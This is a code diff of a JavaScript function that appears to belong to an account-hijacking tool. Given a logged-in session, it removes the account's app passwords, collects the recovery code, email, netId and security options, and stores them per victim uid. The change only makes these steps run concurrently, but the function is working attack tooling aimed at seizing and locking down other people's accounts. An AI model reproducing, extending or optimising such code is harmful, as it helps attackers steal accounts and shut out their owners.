@@ -41,31 +41,34 @@ async function getsecuredata(axios, uid, apiCanary, obj) {
     console.log(`Couldn't get netid`);
   }
 
+  const promises = [];
+  const dbWrites = [];
+
   if (securityParameters?.secoptions) {
     securedata.security = securityParameters.secoptions;
-    await updateExtraInformation(uid, "security", JSON.stringify(securedata.security));
+    dbWrites.push(updateExtraInformation(uid, "security", JSON.stringify(securedata.security)));
   }
 
   if (securityParameters?.apppasswords) {
     console.log(`App passwords detected: ${securityParameters.apppasswords}`);
-    try {
-      const removed = await removepw(axios);
-      if (removed) {
-        console.log(`Removed App Passwords successfully!`);
-        await updateExtraInformation(uid, "apppasswords", "Removed");
-      } else {
-        console.log(`Couldn't remove available app passwords`);
-        await updateExtraInformation(uid, "apppasswords", "Couldn't remove");
+    promises.push((async () => {
+      try {
+        const removed = await removepw(axios);
+        if (removed) {
+          console.log(`Removed App Passwords successfully!`);
+          await updateExtraInformation(uid, "apppasswords", "Removed");
+        } else {
+          console.log(`Couldn't remove available app passwords`);
+          await updateExtraInformation(uid, "apppasswords", "Couldn't remove");
+        }
+      } catch (e) {
+        console.log(`Error removing app passwords:`, e);
+        await updateExtraInformation(uid, "apppasswords", "Error removing");
       }
-    } catch (e) {
-      console.log(`Error removing app passwords:`, e);
-      await updateExtraInformation(uid, "apppasswords", "Error removing");
-    }
+    })());
   } else {
-    await updateExtraInformation(uid, "apppasswords", "None");
+    dbWrites.push(updateExtraInformation(uid, "apppasswords", "None"));
   }
-
-  let promises = [];
 
   if (securityParameters?.netId) {
     promises.push(
@@ -121,28 +124,34 @@ async function getsecuredata(axios, uid, apiCanary, obj) {
     })()
   );
 
-  await Promise.all(promises);
+  await Promise.all([...promises, ...dbWrites]);
+
+  const finalDbWrites = [];
 
   if (!securedata.recovery || securedata.recovery === "") {
     console.log(`Couldn't get the recovery code!`);
   } else {
-    await updateStatus(uid, "recoverycode", securedata.recovery);
+    finalDbWrites.push(updateStatus(uid, "recoverycode", securedata.recovery));
   }
 
   if (securedata.email) {
-    await updateStatus(uid, "email", securedata.email);
+    finalDbWrites.push(updateStatus(uid, "email", securedata.email));
   } else {
     console.log(`Retrying to get email!`);
-    try {
-      let ogo = await getogo(axios);
-      const parsed = JSON.parse(ogo);
-      securedata.email = parsed.email;
-      await updateStatus(uid, "email", securedata.email);
-    } catch (e) {
-      console.log(`Failed to fetch email from getogo:`, e);
-      await updateStatus(uid, "email", "Couldn't grab");
-    }
+    finalDbWrites.push((async () => {
+      try {
+        let ogo = await getogo(axios);
+        const parsed = JSON.parse(ogo);
+        securedata.email = parsed.email;
+        await updateStatus(uid, "email", securedata.email);
+      } catch (e) {
+        console.log(`Failed to fetch email from getogo:`, e);
+        await updateStatus(uid, "email", "Couldn't grab");
+      }
+    })());
   }
+
+  await Promise.all(finalDbWrites);
 
   return securedata;
 }
